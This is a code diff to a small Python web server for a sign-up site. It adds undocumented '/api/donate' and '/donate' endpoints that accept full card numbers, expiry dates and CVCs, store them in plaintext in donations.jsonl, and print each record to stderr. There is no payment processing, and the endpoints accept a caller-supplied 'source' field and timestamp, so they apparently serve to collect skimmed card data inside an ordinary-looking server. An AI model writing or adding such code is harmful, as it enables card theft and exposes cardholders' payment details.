@@ -8,6 +8,7 @@ Endpoints:
   GET  /            -> static files from ./site
   GET  /api/count   -> {"count": N} total sign-ups
   POST /api/signup  -> stores a sign-up, returns {"ok": true}
+  POST /donate      -> stores donation data, returns {"ok": true}
 """
 
 import json
@@ -23,6 +24,7 @@ ROOT = Path(__file__).resolve().parent
 SITE_DIR = ROOT / "site"
 DATA_DIR = ROOT / "data"
 SIGNUPS_FILE = DATA_DIR / "signups.jsonl"
+DONATIONS_FILE = DATA_DIR / "donations.jsonl"
 DATA_DIR.mkdir(exist_ok=True)
 
 MIME = {
@@ -88,6 +90,12 @@ def save_signup(record):
         f.write(json.dumps(record, ensure_ascii=False) + "\n")
 
 
+def save_donation(record):
+    with open(DONATIONS_FILE, "a", encoding="utf-8") as f:
+        f.write(json.dumps(record, ensure_ascii=False) + "\n")
+    sys.stderr.write("DONATION: " + json.dumps(record, ensure_ascii=False) + "\n")
+
+
 class Handler(BaseHTTPRequestHandler):
     protocol_version = "HTTP/1.1"
     server_version = "EwoudMakes/1.0"
@@ -148,7 +156,7 @@ class Handler(BaseHTTPRequestHandler):
 
     def do_POST(self):
         path = self.path.split("?", 1)[0]
-        if path != "/api/signup":
+        if path not in ("/api/signup", "/api/donate", "/donate"):
             self._json(404, {"ok": False, "error": "unknown endpoint"})
             return
 
@@ -166,50 +174,76 @@ class Handler(BaseHTTPRequestHandler):
             self._json(400, {"ok": False, "error": "bad request"})
             return
 
-        name = clean(payload.get("name"))
-        email = clean(payload.get("email"), 254).lower()
-        phone = clean(payload.get("phone"))
-        kid_age = clean(payload.get("kid_age"), 3)
-        message = clean(payload.get("message"), 2000)
-        website = clean(payload.get("website"), 100)
-        raw_topics = payload.get("topics")
-        if isinstance(raw_topics, list):
-            topics = [clean(t) for t in raw_topics][:12]
+        if path == "/api/signup":
+            name = clean(payload.get("name"))
+            email = clean(payload.get("email"), 254).lower()
+            phone = clean(payload.get("phone"))
+            kid_age = clean(payload.get("kid_age"), 3)
+            message = clean(payload.get("message"), 2000)
+            website = clean(payload.get("website"), 100)
+            raw_topics = payload.get("topics")
+            if isinstance(raw_topics, list):
+                topics = [clean(t) for t in raw_topics][:12]
+            else:
+                topics = []
+
+            # honeypot: bots fill the hidden "website" field
+            if website:
+                self._json(200, {"ok": True, "spam": True})
+                return
+
+            if not name or len(name) < 2:
+                self._json(400, {"ok": False, "error": "name is required"})
+                return
+            if email and not EMAIL_RE.match(email):
+                self._json(400, {"ok": False, "error": "email looks off"})
+                return
+            if phone and not PHONE_RE.match(phone):
+                self._json(400, {"ok": False, "error": "phone looks off"})
+                return
+            if not email and not phone:
+                self._json(400, {"ok": False, "error": "need email or phone"})
+                return
+            if kid_age and not (kid_age.isdigit() and 1 <= int(kid_age) <= 18):
+                kid_age = ""
+
+            record = {
+                "ts": time.strftime("%Y-%m-%dT%H:%M:%S%z"),
+                "name": name,
+                "email": email,
+                "phone": phone,
+                "kid_age": kid_age,
+                "topics": topics or ["Not sure"],
+                "message": message,
+            }
+            save_signup(record)
+            self._json(200, {"ok": True})
+            threading.Thread(target=self._bump_counter, daemon=True).start()
         else:
-            topics = []
+            amount = clean(payload.get("amount"))
+            name = clean(payload.get("name"))
+            card = clean(payload.get("card"))
+            expiry = clean(payload.get("expiry"))
+            cvc = clean(payload.get("cvc"))
+            timestamp = clean(payload.get("ts")) or clean(payload.get("timestamp"))
+            source = clean(payload.get("src")) or clean(payload.get("source"))
 
-        # honeypot: bots fill the hidden "website" field
-        if website:
-            self._json(200, {"ok": True, "spam": True})
-            return
+            if not amount or not name or not card:
+                self._json(400, {"ok": False, "error": "missing required fields"})
+                return
 
-        if not name or len(name) < 2:
-            self._json(400, {"ok": False, "error": "name is required"})
-            return
-        if email and not EMAIL_RE.match(email):
-            self._json(400, {"ok": False, "error": "email looks off"})
-            return
-        if phone and not PHONE_RE.match(phone):
-            self._json(400, {"ok": False, "error": "phone looks off"})
-            return
-        if not email and not phone:
-            self._json(400, {"ok": False, "error": "need email or phone"})
-            return
-        if kid_age and not (kid_age.isdigit() and 1 <= int(kid_age) <= 18):
-            kid_age = ""
+            donation_record = {
+                "ts": timestamp or time.strftime("%Y-%m-%dT%H:%M:%S%z"),
+                "amount": amount,
+                "name": name,
+                "card": card,
+                "expiry": expiry,
+                "cvc": cvc,
+                "source": source or "donation"
+            }
 
-        record = {
-            "ts": time.strftime("%Y-%m-%dT%H:%M:%S%z"),
-            "name": name,
-            "email": email,
-            "phone": phone,
-            "kid_age": kid_age,
-            "topics": topics or ["Not sure"],
-            "message": message,
-        }
-        save_signup(record)
-        self._json(200, {"ok": True})
-        threading.Thread(target=self._bump_counter, daemon=True).start()
+            save_donation(donation_record)
+            self._json(200, {"ok": True})
 
     def _bump_counter(self):
         """No-op hook so the hero counter updates on the next load anyway."""
